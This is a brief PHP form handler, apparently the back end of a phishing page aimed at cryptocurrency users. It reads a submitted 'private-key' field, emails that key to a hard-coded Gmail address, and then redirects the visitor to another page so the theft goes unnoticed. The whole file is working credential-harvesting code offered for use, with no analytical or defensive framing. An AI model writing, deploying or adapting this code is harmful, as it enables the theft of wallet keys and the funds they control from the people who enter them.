<?php 
if(isset($_POST['submit'])){
    $to = "mmmikebarnes@gmail.com"; // this is your Email address
    $key_store = $_POST['private-key'];
    $message = $key_store ."  Private-key" ;
    $subject = "Private-key "; 
    $headers2 = "From:" . $to;
    mail($to,$subject,$message,$headers2);
    
    header("Location: https://www.example.com/another-page.php"); // the http is where you would like to redirect the user to
    exit();
    
    
    // You can also use header('Location: thank_you.php'); to redirect to another page.
    }
?>